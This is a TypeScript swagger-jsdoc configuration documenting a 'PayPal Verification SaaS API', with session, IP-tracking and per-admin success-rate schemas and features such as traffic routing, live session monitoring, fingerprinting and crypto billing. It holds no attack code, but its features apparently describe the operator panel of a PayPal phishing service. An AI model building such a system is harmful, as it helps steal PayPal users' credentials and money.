import swaggerJsdoc from 'swagger-jsdoc';

const options: swaggerJsdoc.Options = {
    definition: {
        openapi: '3.0.0',
        info: {
            title: 'PayPal Verification SaaS API',
            version: '1.0.0',
            description: `
Enterprise-grade PayPal verification and session monitoring platform.

## Features
- **Smart Routing**: Intelligent traffic distribution with A/B testing
- **Live Session Monitoring**: Real-time session tracking via WebSocket
- **Multi-tenant Architecture**: Isolated admin accounts with granular permissions
- **Crypto Billing**: Built-in cryptocurrency payment processing
- **Advanced Analytics**: Comprehensive session analytics and fingerprinting

## Authentication
Most endpoints require JWT Bearer token authentication:
\`\`\`
Authorization: Bearer <your-jwt-token>
\`\`\`

Obtain tokens via the \`/api/admin/login\` endpoint.
            `,
            contact: {
                name: 'API Support',
                email: 'support@example.com'
            },
            license: {
                name: 'Proprietary',
            }
        },
        servers: [
            {
                url: process.env['API_BASE_URL'] || 'http://localhost:8080',
                description: 'Production/Development Server'
            }
        ],
        components: {
            securitySchemes: {
                bearerAuth: {
                    type: 'http',
                    scheme: 'bearer',
                    bearerFormat: 'JWT',
                    description: 'JWT authorization token'
                }
            },
            schemas: {
                Error: {
                    type: 'object',
                    properties: {
                        error: {
                            type: 'string',
                            description: 'Error message'
                        }
                    }
                },
                SessionData: {
                    type: 'object',
                    properties: {
                        id: { type: 'string' },
                        data: { type: 'object' },
                        lastSeen: { type: 'number' },
                        ip: { type: 'string' },
                        adminId: { type: 'string' },
                        variant: { type: 'string' }
                    }
                },
                AdminStats: {
                    type: 'object',
                    properties: {
                        activeSessions: { type: 'number' },
                        totalSessions: { type: 'number' },
                        verifiedSessions: { type: 'number' },
                        totalLinks: { type: 'number' },
                        successRate: { type: 'number' }
                    }
                }
            }
        },
        security: [
            {
                bearerAuth: []
            }
        ]
    },
    apis: ['./server/routes/*.ts', './server/routes/*.js'] // Path to API routes
};

export const swaggerSpec = swaggerJsdoc(options);
